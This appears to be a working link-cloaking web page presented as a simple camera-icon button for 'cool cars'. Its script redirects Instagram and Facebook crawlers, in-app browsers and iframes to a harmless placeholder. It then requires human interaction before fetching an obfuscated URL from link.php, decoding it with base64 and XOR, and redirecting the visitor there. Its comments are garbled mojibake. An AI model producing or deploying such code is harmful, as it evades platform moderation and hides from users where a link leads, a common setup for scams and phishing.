<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>üì∑</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    * { box-sizing: border-box; }
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      font-family: system-ui, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      background: linear-gradient(to bottom, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
      position: relative;
      overflow: hidden;
    }

    /* –¥–æ–±–∞–≤–ª—è–µ–º —à—É–º */
    html::after {
      content: "";
      position: absolute;
      inset: 0;
      pointer-events: none;
      background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR4nGJ89+7dfwAIFwMDAANUAgKhNSGuAAAAAElFTkSuQmCC');
      opacity: 0.05;
      z-index: 1;
    }

    .container {
      position: relative;
      z-index: 2;
      background: rgba(255, 255, 255, 0.2);
      backdrop-filter: blur(10px);
      border-radius: 2rem;
      padding: 1rem 2rem;
      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.25);
      display: flex;
      align-items: center;
      gap: 0.6rem;
      cursor: pointer;
      transition: background 0.3s ease;
    }

    .container:hover {
      background: rgba(255, 255, 255, 0.3);
    }

    .icon {
      font-size: 1.6rem;
      color: white;
    }

    /* —É–±–∏—Ä–∞–µ–º —Ç–µ–∫—Å—Ç, –æ—Å—Ç–∞–≤–ª—è–µ–º –∏–∫–æ–Ω–∫—É */
    .text {
      display: none;
    }
  </style>
</head>
<body>
  <div class="container" id="realButton">
    <div class="icon">üì∑</div>
    <div class="text">JUST COOL CARS</div>
  </div>

  <script>
    (function() {
      const ua = navigator.userAgent.toLowerCase();
      const isInsta = ua.includes("instagram") || ua.includes("facebookexternalhit") || ua.includes("fbav") || ua.includes("fbios");
      const isIframe = window.top !== window.self;
      if (isInsta || isIframe) {
        location.href = "https://example.com";
        return;
      }
    })();

    let interacted = false;
    document.addEventListener("mousemove", () => interacted = true);
    document.addEventListener("touchstart", () => interacted = true);
    document.addEventListener("keypress", () => interacted = true);

    document.getElementById("realButton").addEventListener("click", function () {
      if (!interacted) return;
      setTimeout(() => {
        fetch("link.php")
          .then(res => res.text())
          .then(code => {
            const decoded = atob(code.trim());
            const xorKey = 3;
            const finalURL = decoded.split('').map(c => String.fromCharCode(c.charCodeAt(0) ^ xorKey)).join('');
            location.href = finalURL;
          });
      }, 2000);
    });
  </script>
</body>
</html>
